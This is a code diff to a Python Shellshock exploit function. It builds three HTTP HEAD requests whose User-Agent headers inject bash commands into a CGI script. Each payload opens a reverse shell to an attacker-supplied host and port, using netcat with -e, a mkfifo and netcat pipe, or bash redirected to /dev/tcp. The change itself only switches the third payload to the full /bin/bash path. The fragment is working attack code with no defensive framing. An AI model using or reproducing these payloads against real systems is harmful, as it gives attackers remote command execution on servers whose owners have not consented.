@@ -18,7 +18,7 @@ def shellshock_http_payloads(lhost, lport, rhost, rport, target_url):
    # These are the actual payloads which get packed and returned to main in a list 
    payload_1 = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc %s %d -e /bin/sh\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
    payload_2 = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; rm /tmp/f;mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc %s %d\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
-   payload_3 = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; bash -i >& /dev/tcp/%s/%d 0>&1\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
+   payload_3 = b"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /bin/bash -i >& /dev/tcp/%s/%d 0>&1\r\nHost: %s\r\nConnection: close\r\n\r\n" % (lhost_encoded, lport, rhost_encoded)
    payloads.append(payload_1)
    payloads.append(payload_2)
    payloads.append(payload_3)
